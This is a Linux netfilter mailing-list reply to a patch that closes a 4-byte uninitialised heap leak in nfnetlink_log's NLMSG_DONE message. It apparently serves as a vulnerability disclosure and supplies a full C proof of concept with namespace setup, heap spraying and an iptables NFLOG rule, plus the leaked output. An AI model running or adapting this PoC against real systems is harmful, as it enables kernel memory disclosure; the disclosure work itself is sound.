Received: from mail-dy1-f182.google.com (mail-dy1-f182.google.com [74.125.82.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F2EBD2FFDD6
	for <netfilter-devel@vger.kernel.org>; Wed,  1 Apr 2026 20:06:51 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.182
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1775074013; cv=none; b=fVWRxlc3kzHHlY/jSMPPlkp4/ZPWY4g89zDvptlEGRNcpGdFWq0mHGbKr37MoKafiyNojd3z1TiAlocJO1GilGUCgJN5qc6DTbJpNXWMoChEIdSB2N9wV7O6DIcAA6q//AptN7wuKOOhVjoDJzhWxjN4FFY9rpDtEuG9HFY72rg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1775074013; c=relaxed/simple;
	bh=6ZVkBOKK6DPp7GZjU37hTycmuM3dSyFANo/1Hd9DZiI=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=VcauBmX8qvSRVliy4q2LtzoP5jUY2ekHlxWGtBCHa68Sd2OjbudE7t32fUxk3wsfnYl9fXODqyyDFWOy8nz2a44cU01gEZmDGOiV6JEM4CJ/+k9z/GJk9ScBT9Wd4HTHI3uBY6D3Bxi5Mu6o5wiGvuNVhvkHeMhPzuSITpogCTk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=ji4sWA8B; arc=none smtp.client-ip=74.125.82.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="ji4sWA8B"
Received: by mail-dy1-f182.google.com with SMTP id 5a478bee46e88-2c15849aa2cso258038eec.0
        for <netfilter-devel@vger.kernel.org>; Wed, 01 Apr 2026 13:06:51 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1775074011; x=1775678811; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=hiaZssOsOCxll3Hwu06BB90WXwSOxDOvuJ5txYMSYRw=;
        b=ji4sWA8BFPHTSFKvDq54dDEQpbtW/hqZc1xeTMHjTQeWRw7TH4yMArxQ1owvH94j6u
         UMNdT09ec5GnLID23HzGFuZrp1SjzlYnMfZ80fjAkOZnM6Wk7tFN/SXWlOka7Isx/Etk
         nZ/Aciwss4JS7oiJYUtiDZvqbRCZbFUqmvFzqQEKOis7gXSVdMhceJKXPvCZvrBQLc3Z
         3eodVaJxWPVdCMGJzEfRFykIQGcHtN2n1snNn4mXlaKzZZtr9Ovr2aB7ouNv5yMVjeJX
         K/eiFCO8an3jIMP9Yjt7T2eZUtC+msgp/OMQ9y7kTfGYGEP58ixqrHfFcqNvS9GsqkQ9
         6RSQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1775074011; x=1775678811;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=hiaZssOsOCxll3Hwu06BB90WXwSOxDOvuJ5txYMSYRw=;
        b=Vq1VjZvINJBGTHHuCUsGklGVIiy3djSOxM17UNqGMTJMX7vtyIrPpxdM+f//BcW0L5
         E59SPw5PnWW6bLN8ytoQZjavrPs4+1QPSnCNv1PMbPkxmkpkN+z777fO2zaveaZVTYQg
         E1fRd2XcTOgLnulDMyibT+CzGWtAKNfCEn/HM5WzxBcsCkAONIz5E2VuliZp4/OLK08y
         NUyohKyqfHlk4WSOZJWTf12ciUqeebvOBckhLrvSTobr/R9IXNY/P5/Ky2bRoSN4QLZl
         dwGk17wsjoGCygeuUR2JspN15omypdfKGWuqnO+9MpIbgNWeX6ASccxn4xoLTzQdtQwX
         mZhA==
X-Gm-Message-State: AOJu0YzcE14/PX83nYoE8HtGL5KFJ32JKrjPSeuDaip3Bh/uiqhP0rZn
	UGdDCzPCblObvnAe0njrl1ci1+JP4CSlcB+SicWn3bnvHUfnltgX0nnFlcaQi18Cmdz1VSW+w7z
	LtpW6wxD+
X-Gm-Gg: ATEYQzzER6c3a6IRbpG905I0t7iH5JZBRetkydaZFsu2BZ480ttDi5v3bGEEA+rn21s
	RSXuIY9MChdG30PeP+4+YeV0mCphm9KPYBmPbxNLbktdI3D0hLUFSUtGOqEYVNYAv4h5rmwcmxs
	YzrHkYvCZIsNSQq17WKW+N9ir4HeJ80/6M25PEiTGz4z4RNYlWbXndQ0btPQmXTjQRuQJDXYRDN
	MsMljD+pKtrvS3irx+ux9L88pkkQprbwxEpyxY33FxAxhU0y9vCLqEFQL49y5NFws8+Td68C8+r
	W6BvSvRhQobMY9RHPzEcRJVMXklWgLy6xZcblQuXWs7KmI9IdnVIiQNallWtpp619XUAMSKBjET
	iKSEhzvEuspRDGOI2vMN510YuiMRh1sIs7KxJc+oGrXuFp5hKWhze1DphkSrBXPwpVjfjzJb104
	I78uLaEQ/Je+sDlN6Wv6iCxwJtLgUz3g==
X-Received: by 2002:a05:7301:7214:b0:2ba:8018:cc57 with SMTP id 5a478bee46e88-2c93106db14mr2321327eec.11.1775074010664;
        Wed, 01 Apr 2026 13:06:50 -0700 (PDT)
Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-2ca793eecd1sm584827eec.10.2026.04.01.13.06.49
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 01 Apr 2026 13:06:50 -0700 (PDT)
Date: Wed, 1 Apr 2026 13:06:48 -0700
From: Xiang Mei <xmei5@asu.edu>
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org, fw@strlen.de, phil@nwl.cc, davem@davemloft.net, 
	eric@inl.fr, coreteam@netfilter.org, netdev@vger.kernel.org, 
	bestswngs@gmail.com
Subject: Re: [PATCH net] netfilter: nfnetlink_log: initialize nfgenmsg in
 NLMSG_DONE terminator
Message-ID: <kcauifbv3lv2taswirh6fdct7kjgpe2hlp5kgba6tk6x3zfkxo@jnqggwqiqmbd>
References: <20260401195735.564488-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260401195735.564488-1-xmei5@asu.edu>

On Wed, Apr 01, 2026 at 12:57:35PM -0700, Xiang Mei wrote:
> When batching multiple NFLOG messages (inst->qlen > 1), __nfulnl_send()
> appends an NLMSG_DONE terminator with sizeof(struct nfgenmsg) payload via
> nlmsg_put(), but never initializes the nfgenmsg bytes. The nlmsg_put()
> helper only zeroes alignment padding after the payload, not the payload
> itself, so four bytes of stale kernel heap data are leaked to userspace
> in the NLMSG_DONE message body.
> 
> Initialize the nfgenmsg struct after nlmsg_put(), consistent with how
> __build_packet_message() populates nfgenmsg for regular NFULNL_MSG_PACKET
> messages, to prevent leaking kernel heap data to userspace.
> 
> Fixes: 29c5d4afba51 ("[NETFILTER]: nfnetlink_log: fix sending of multipart messages")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  net/netfilter/nfnetlink_log.c | 5 +++++
>  1 file changed, 5 insertions(+)
> 
> diff --git a/net/netfilter/nfnetlink_log.c b/net/netfilter/nfnetlink_log.c
> index fcbe54940b2e..ad4eaf27590e 100644
> --- a/net/netfilter/nfnetlink_log.c
> +++ b/net/netfilter/nfnetlink_log.c
> @@ -361,6 +361,7 @@ static void
>  __nfulnl_send(struct nfulnl_instance *inst)
>  {
>  	if (inst->qlen > 1) {
> +		struct nfgenmsg *nfmsg;
>  		struct nlmsghdr *nlh = nlmsg_put(inst->skb, 0, 0,
>  						 NLMSG_DONE,
>  						 sizeof(struct nfgenmsg),
> @@ -370,6 +371,10 @@ __nfulnl_send(struct nfulnl_instance *inst)
>  			kfree_skb(inst->skb);
>  			goto out;
>  		}
> +		nfmsg = nlmsg_data(nlh);
> +		nfmsg->nfgen_family = AF_UNSPEC;
> +		nfmsg->version = NFNETLINK_V0;
> +		nfmsg->res_id = htons(inst->group_num);
>  	}
>  	nfnetlink_unicast(inst->skb, inst->net, inst->peer_portid);
>  out:
> -- 
> 2.43.0
>

Thanks for your attention to this bug. It's a 4 bytes uninit heap data 
leak vulenrability. A non-root user with ns_capable(ns,CAP_NET_ADMIN)
can trigger the bug. I'll attach the required information to help you 
reproduce the bug.

Required Configs:
```
CONFIG_IP_NF_IPTABLES_LEGACY=y
CONFIG_IP_NF_FILTER=y

```

PoC Source Code:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nfnetlink_log.h>
#include <linux/netfilter_ipv4/ip_tables.h>
#include <linux/netfilter/xt_NFLOG.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <linux/sockios.h>
#include <fcntl.h>

#define NFLOG_GROUP  100
#define QTHRESHOLD   2
#define NFNL_SUBSYS_ULOG 4
#define ROUNDS       20

/* Dirty the skb slab with non-zero data so the leak is visible */
static void spray_heap(void)
{
    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(9999),
                               .sin_addr.s_addr = htonl(INADDR_LOOPBACK) };
    uint32_t buf[512];
    for (int i = 0; i < 512; i++) buf[i] = 0xdeadbeef;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    for (int i = 0; i < 200; i++)
        sendto(s, buf, sizeof(buf), MSG_DONTWAIT,
               (struct sockaddr *)&dst, sizeof(dst));
    close(s);
}

/* ---- namespace setup ---- */
static void setup_ns(void)
{
    if (unshare(CLONE_NEWUSER) < 0) { perror("unshare(NEWUSER)"); exit(1); }
    FILE *f;
    f = fopen("/proc/self/setgroups", "w");
    if (f) { fprintf(f, "deny"); fclose(f); }
    f = fopen("/proc/self/uid_map", "w");
    if (f) { fprintf(f, "0 %d 1\n", getuid()); fclose(f); }
    f = fopen("/proc/self/gid_map", "w");
    if (f) { fprintf(f, "0 %d 1\n", getgid()); fclose(f); }
    if (unshare(CLONE_NEWNET) < 0) { perror("unshare(NEWNET)"); exit(1); }

    /* bring up loopback */
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr = {0};
    strcpy(ifr.ifr_name, "lo");
    ioctl(s, SIOCGIFFLAGS, &ifr);
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    ioctl(s, SIOCSIFFLAGS, &ifr);
    close(s);
}

/* ---- netlink helpers ---- */
static int nflog_request(int fd, int seq, uint16_t group,
                         void *attr_buf, int attr_len)
{
    char buf[512] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
    nlh->nlmsg_type = (NFNL_SUBSYS_ULOG << 8) | NFULNL_MSG_CONFIG;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq = seq;
    struct nfgenmsg *nfg = NLMSG_DATA(nlh);
    nfg->nfgen_family = AF_UNSPEC;
    nfg->version = NFNETLINK_V0;
    nfg->res_id = htons(group);

    if (attr_buf) {
        memcpy((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len), attr_buf, attr_len);
        nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + attr_len;
    }

    struct sockaddr_nl dest = { .nl_family = AF_NETLINK };
    if (sendto(fd, buf, nlh->nlmsg_len, 0,
               (struct sockaddr *)&dest, sizeof(dest)) < 0)
        return -1;
    int len = recv(fd, buf, sizeof(buf), 0);
    if (len < 0) return -1;
    nlh = (struct nlmsghdr *)buf;
    if (nlh->nlmsg_type == NLMSG_ERROR) {
        int *err = NLMSG_DATA(nlh);
        if (*err) { errno = -*err; return *err; }
    }
    return 0;
}

/* ---- iptables NFLOG rule via setsockopt ---- */
static int setup_iptables_nflog(void)
{
    size_t tgt_sz  = XT_ALIGN(sizeof(struct xt_entry_target) + sizeof(struct xt_nflog_info));
    size_t acc_sz  = XT_ALIGN(sizeof(struct xt_entry_target) + sizeof(int));
    size_t acc_ent = sizeof(struct ipt_entry) + acc_sz;
    size_t nfl_ent = sizeof(struct ipt_entry) + tgt_sz;
    size_t all     = acc_ent * 2 + nfl_ent + acc_ent; /* IN + FWD + OUT(nflog+accept) */
    size_t tbl_sz  = sizeof(struct ipt_replace) + all;

    char *tbl = calloc(1, tbl_sz);
    if (!tbl) return -1;
    struct ipt_replace *r = (struct ipt_replace *)tbl;
    strcpy(r->name, "filter");
    r->valid_hooks = (1<<NF_INET_LOCAL_IN)|(1<<NF_INET_FORWARD)|(1<<NF_INET_LOCAL_OUT);
    r->num_entries = 4;
    r->size = all;
    r->num_counters = 4;
    struct xt_counters ctrs[4] = {0};
    r->counters = ctrs;
    r->hook_entry[NF_INET_LOCAL_IN]  = 0;
    r->hook_entry[NF_INET_FORWARD]   = acc_ent;
    r->hook_entry[NF_INET_LOCAL_OUT]  = acc_ent * 2;
    r->underflow[NF_INET_LOCAL_IN]   = 0;
    r->underflow[NF_INET_FORWARD]    = acc_ent;
    r->underflow[NF_INET_LOCAL_OUT]  = acc_ent * 2 + nfl_ent;

    char *p = tbl + sizeof(struct ipt_replace);

    /* INPUT & FORWARD: ACCEPT */
    for (int i = 0; i < 2; i++, p += acc_ent) {
        struct ipt_entry *e = (struct ipt_entry *)p;
        e->target_offset = sizeof(struct ipt_entry);
        e->next_offset = acc_ent;
        struct xt_standard_target *t = (void *)p + e->target_offset;
        t->target.u.target_size = acc_sz;
        t->verdict = -NF_ACCEPT - 1;
    }

    /* OUTPUT: NFLOG */
    {
        struct ipt_entry *e = (struct ipt_entry *)p;
        e->target_offset = sizeof(struct ipt_entry);
        e->next_offset = nfl_ent;
        struct xt_entry_target *t = (void *)p + e->target_offset;
        t->u.target_size = tgt_sz;
        strcpy(t->u.user.name, "NFLOG");
        struct xt_nflog_info *ni = (void *)t->data;
        ni->group = NFLOG_GROUP;
        ni->threshold = QTHRESHOLD;
        p += nfl_ent;
    }

    /* OUTPUT underflow: ACCEPT */
    {
        struct ipt_entry *e = (struct ipt_entry *)p;
        e->target_offset = sizeof(struct ipt_entry);
        e->next_offset = acc_ent;
        struct xt_standard_target *t = (void *)p + e->target_offset;
        t->target.u.target_size = acc_sz;
        t->verdict = -NF_ACCEPT - 1;
    }

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) { free(tbl); return -1; }
    int ret = setsockopt(fd, IPPROTO_IP, IPT_SO_SET_REPLACE, tbl, tbl_sz);
    close(fd);
    free(tbl);
    return ret;
}

int main(void)
{

    /* Step 1: user+net namespace */
    setup_ns();

    /* Step 2: create NFLOG listener, bind group, set qthreshold=2 */
    int nlfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (nlfd < 0) { perror("socket"); return 1; }
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    bind(nlfd, (struct sockaddr *)&sa, sizeof(sa));

    /* bind command */
    struct { struct nlattr nla; struct nfulnl_msg_config_cmd cmd; }
        bind_attr = { { NLA_HDRLEN + sizeof(struct nfulnl_msg_config_cmd),
                        NFULA_CFG_CMD }, { NFULNL_CFG_CMD_BIND } };
    if (nflog_request(nlfd, 1, NFLOG_GROUP, &bind_attr,
                      NLA_ALIGN(bind_attr.nla.nla_len)) < 0) {
        perror("bind group"); return 1;
    }

    /* set copy mode + qthreshold */
    char cfg[64] = {0};
    int off = 0;
    struct nfulnl_msg_config_mode mode = { .copy_mode = NFULNL_COPY_PACKET,
                                           .copy_range = htonl(0xffff) };
    struct nlattr *a = (void *)(cfg + off);
    a->nla_len = NLA_HDRLEN + sizeof(mode);
    a->nla_type = NFULA_CFG_MODE;
    memcpy(cfg + off + NLA_HDRLEN, &mode, sizeof(mode));
    off += NLA_ALIGN(a->nla_len);

    __be32 qt = htonl(QTHRESHOLD);
    a = (void *)(cfg + off);
    a->nla_len = NLA_HDRLEN + sizeof(qt);
    a->nla_type = NFULA_CFG_QTHRESH;
    memcpy(cfg + off + NLA_HDRLEN, &qt, sizeof(qt));
    off += NLA_ALIGN(a->nla_len);

    if (nflog_request(nlfd, 2, NFLOG_GROUP, cfg, off) < 0) {
        perror("set params"); return 1;
    }

    /* Step 3: install iptables NFLOG rule */
    if (setup_iptables_nflog() < 0) {
        perror("iptables"); return 1;
    }

    /* Step 4: send packets and check NLMSG_DONE payloads */
    int total_done = 0, total_leaked = 0;
    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(12345),
                               .sin_addr.s_addr = htonl(INADDR_LOOPBACK) };
    struct timeval tv = { .tv_sec = 1 };
    setsockopt(nlfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    spray_heap();

    for (int round = 0; round < ROUNDS; round++) {
        if (round % 5 == 0) spray_heap();
        /* generate packets to trigger batching */
        int udp = socket(AF_INET, SOCK_DGRAM, 0);
        for (int i = 0; i < QTHRESHOLD * 2 + 1; i++)
            sendto(udp, "x", 1, 0, (struct sockaddr *)&dst, sizeof(dst));
        close(udp);
        usleep(50000);

        /* read NFLOG messages */
        char buf[65536];
        for (;;) {
            int len = recv(nlfd, buf, sizeof(buf), 0);
            if (len <= 0) break;
            struct nlmsghdr *nlh = (void *)buf;
            int rem = len;
            while (NLMSG_OK(nlh, rem)) {
                if (nlh->nlmsg_type == NLMSG_DONE) {
                    total_done++;
                    unsigned char *p = NLMSG_DATA(nlh);
                    int plen = nlh->nlmsg_len - NLMSG_HDRLEN;
                    if (plen >= 4) {
                        /* accept zero (uninit but clean) and the
                           properly initialized value as non-leaks */
                        uint8_t fixed[4] = {0, 0, 0, 0};
                        *(uint16_t *)(fixed + 2) = htons(NFLOG_GROUP);
                        if (memcmp(p, "\0\0\0\0", 4) != 0 &&
                            memcmp(p, fixed, 4) != 0) {
                            total_leaked++;
                            printf("  [DONE#%d] %02x %02x %02x %02x"
                                   " - LEAKED!\n", total_done,
                                   p[0], p[1], p[2], p[3]);
                        }
                    }
                }
                nlh = NLMSG_NEXT(nlh, rem);
            }
        }
    }

    printf("\nNLMSG_DONE: %d total, %d leaked\n", total_done, total_leaked);
    if (total_leaked)
        printf("[+] BUG CONFIRMED: %d/%d NLMSG_DONE had uninit heap data\n",
               total_leaked, total_done);
    else if (total_done)
        printf("[*] All NLMSG_DONE payloads were zero (heap was clean)\n");
    else
        printf("[-] No NLMSG_DONE received\n");

    close(nlfd);
    return 0;
}

```

Intended Leak:
```
++ su - user -c /tmp/exp/poc
  [DONE#49] ef be ad de - LEAKED!
  [DONE#50] ef be ad de - LEAKED!
  [DONE#51] ef be ad de - LEAKED!
  [DONE#52] ef be ad de - LEAKED!
  [DONE#53] ef be ad de - LEAKED!
  [DONE#54] ef be ad de - LEAKED!
```

Please let me know if you have any questions for the patch and poc.

Thanks,
Xiang

